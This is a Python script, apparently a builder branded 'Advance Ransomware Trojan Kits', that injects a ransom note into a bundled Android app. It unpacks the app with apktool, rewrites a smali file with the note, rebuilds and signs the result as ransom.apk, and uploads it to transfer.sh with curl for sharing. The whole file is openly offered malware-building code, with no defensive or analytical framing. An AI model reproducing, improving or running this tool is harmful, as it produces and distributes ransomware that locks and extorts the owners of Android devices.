#! /usr/bin/env python3
import os, sys, time, fileinput
from getpass import getpass
from PIL import Image

r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
gr = "\033[2;37m"
B = "\033[1;44m"
w = "\033[0m"
br = "\033[1;37;41m"
bold = "\033[1m"

rn = ""

def upload():
	link=os.popen(f"curl -s --upload-file ransom.apk https://transfer.sh").readline().strip()
	print(f"{b}>{w} Success shared to: {g}{link}{w}")

def banner():
	print(f"""{bold}\t ___
\t|[_]| Advance Ransomware
\t|+ ;| Trojan Kits - {br} ARTKs {w}
\t`---'{gr} Developed by: Kitty dev\n""")
		   
def writefile(file,old,new):
    while True:
        if os.path.isfile(file):
            replaces = {old:new}
            for line in fileinput.input(file, inplace=True):
                for search in replaces:
                    replaced = replaces[search]
                    line = line.replace(search,replaced)
                print(line, end="")
            break
        else: exit(r+"[!]"+w+" Failed to write in file "+file)

def start():
    global app_name
    os.system("clear")
    banner()
    while True:
        x = str(input(f"{bold}{r}>>{w} {bold}SET Ransom Information: "+y))
        if len(x) != 0:
            rn = x
            break
        else: continue
    print(w+"* Building your ransomware APK's ...")
    print(w+"-"*43+d)
    os.system("dpkg -i apktool_2.3.4_all.deb")
    os.system("apktool d beta.apk")
    smali = os.popen(f"find -L beta/ -name '*0000.smali'","r").readline().strip()
    print("I: Using smali "+os.path.basename(smali))
    writefile("beta/smali/com/example/kico/myapplication/Main2Activity.smali","message_victim",rn)
    print("I: Adding RansomNote with "+rn)
    time.sleep(3)
    os.system("apktool b beta --output final.apk;rm -rf beta")
    os.system("apksigner autokey final.apk ransom.apk;rm -rf final.apk")
    upload()
    
if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        exit(gr+" Thanks for using my tool :D")